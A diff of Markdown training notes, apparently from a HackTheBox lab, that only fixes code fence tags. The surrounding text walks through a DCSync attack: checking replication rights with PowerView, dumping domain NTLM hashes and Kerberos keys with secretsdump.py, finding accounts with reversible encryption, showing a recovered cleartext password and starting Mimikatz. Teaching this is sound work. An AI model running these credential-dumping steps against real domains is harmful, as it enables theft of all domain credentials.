@@ -28,8 +28,7 @@ It is common during an assessment to find other accounts that have these rights,
 
 #### Using Get-DomainUser to View adunn's Group Membership
 
-```
-        powershell
+```powershell
 PS C:\htb> Get-DomainUser -Identity adunn  |select samaccountname,objectsid,memberof,useraccountcontrol |fl
 
 samaccountname     : adunn
@@ -45,8 +44,7 @@ PowerView can be used to confirm that this standard user does indeed have the ne
 
 #### Using Get-ObjectAcl to Check adunn's Replication Rights
 
-```
-        powershell
+```powershell
 PS C:\htb> $sid= "S-1-5-21-3842939050-3880317879-2865463114-1164"
 PS C:\htb> Get-ObjectAcl "DC=inlanefreight,DC=local" -ResolveGUIDs | ? { ($_.ObjectAceType -match 'Replication-Get')} | ?{$_.SecurityIdentifier -match $sid} |select AceQualifier, ObjectDN, ActiveDirectoryRights,SecurityIdentifier,ObjectAceType | fl
 
@@ -87,8 +85,7 @@ Running the tool as below will write all hashes to files with the prefix `inlane
 
 #### Extracting NTLM Hashes and Kerberos Keys Using secretsdump.py
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ secretsdump.py -outputfile inlanefreight_hashes -just-dc INLANEFREIGHT/adunn@172.16.5.5 
 
 Impacket v0.9.23 - Copyright 2021 SecureAuth Corporation
@@ -137,8 +134,7 @@ If we check the files created using the `-just-dc` flag, we will see that there 
 
 #### Listing Hashes, Kerberos Keys, and Cleartext Passwords
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ ls inlanefreight_hashes*
 
 inlanefreight_hashes.ntds  inlanefreight_hashes.ntds.cleartext  inlanefreight_hashes.ntds.kerberos
@@ -154,8 +150,7 @@ When this option is set on a user account, it does not mean that the passwords a
 
 #### Enumerating Further using Get-ADUser
 
-```
-        powershell
+```powershell
 PS C:\htb> Get-ADUser -Filter 'userAccountControl -band 128' -Properties userAccountControl
 
 DistinguishedName  : CN=PROXYAGENT,OU=Service Accounts,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL
@@ -175,8 +170,7 @@ We can see that one account, `proxyagent`, has the reversible encryption option 
 
 #### Checking for Reversible Encryption Option using Get-DomainUser
 
-```
-        powershell
+```powershell
 PS C:\htb> Get-DomainUser -Identity * | ? {$_.useraccountcontrol -like '*ENCRYPTED_TEXT_PWD_ALLOWED*'} |select samaccountname,useraccountcontrol
 
 samaccountname                         useraccountcontrol
@@ -188,8 +182,7 @@ We will notice the tool decrypted the password and provided us with the cleartex
 
 #### Displaying the Decrypted Password
 
-```
-        shellsession
+```shellsession
 hiimeins@htb[/htb]$ cat inlanefreight_hashes.ntds.cleartext 
 
 proxyagent:CLEARTEXT:Pr0xy_ILFREIGHT!
@@ -203,8 +196,7 @@ Also it is important to note that Mimikatz must be ran in the context of the use
 
 #### Using runas.exe
 
-```
-        cmd
+```bat
 Microsoft Windows [Version 10.0.17763.107]
 (c) 2018 Microsoft Corporation. All rights reserved.
 
@@ -217,8 +209,7 @@ From the newly spawned powershell session, we can perform the attack:
 
 #### Performing the Attack with Mimikatz
 
-```
-        powershell
+```powershell
 PS C:\htb> .\mimikatz.exe
 
   .#####.   mimikatz 2.2.0 (x64) #19041 Aug 10 2021 17:19:53
